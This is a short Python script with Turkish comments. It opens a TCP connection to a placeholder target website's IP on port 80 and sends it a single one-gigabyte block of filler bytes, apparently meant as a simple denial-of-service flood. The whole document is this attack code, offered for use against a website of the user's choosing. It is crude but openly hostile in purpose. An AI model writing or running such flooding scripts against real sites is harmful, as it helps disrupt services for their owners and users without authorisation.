import socket

target_ip = "hedef_web_sitesinin_IP_adresi"
target_port = 80

# Socket oluşturma ve web sitesine bağlanma
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, target_port))

# Yüksek GB'lık paket gönderme
packet = b"A" * (1024 * 1024 * 1024)  # Göndermek istediğiniz GB sayısı
sock.sendall(packet)

# Bağlantıyı kapatma
sock.close()